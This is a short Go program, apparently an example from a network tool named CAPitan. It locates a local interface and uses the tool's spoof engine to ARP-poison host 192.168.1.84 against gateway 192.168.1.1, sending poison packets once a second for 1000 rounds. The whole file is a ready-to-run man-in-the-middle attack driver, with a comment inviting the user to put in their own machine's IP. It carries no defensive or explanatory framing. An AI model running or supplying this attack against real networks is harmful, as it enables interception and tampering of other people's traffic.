package main

import (
	"fmt"
	"github.com/google/gopacket/pcap"
	"github.com/shoriwe/CAPitan/internal/spoof"
	"net"
	"time"
)

func main() {
	devices, err := pcap.FindAllDevs()
	if err != nil {
		panic(err)
	}
	var targetDevice string
	for _, device := range devices {
		for _, address := range device.Addresses {
			if address.IP.Equal(net.ParseIP("192.168.1.33")) { // You should change this for the IP of your machine in the network you want
				targetDevice = device.Name
				break
			}
		}
	}
	if targetDevice == "" {
		panic("no device found")
	}

	engine, engineCreationError := spoof.NewEngine("192.168.1.84", "192.168.1.1", targetDevice)
	if engineCreationError != nil {
		panic(engineCreationError)
	}
	defer engine.Close()
	for i := 0; i < 1000; i++ {
		fmt.Println("Poisoning")
		poisonError := engine.Poison()
		if poisonError != nil {
			panic(poisonError)
		}
		time.Sleep(time.Second)
	}
}
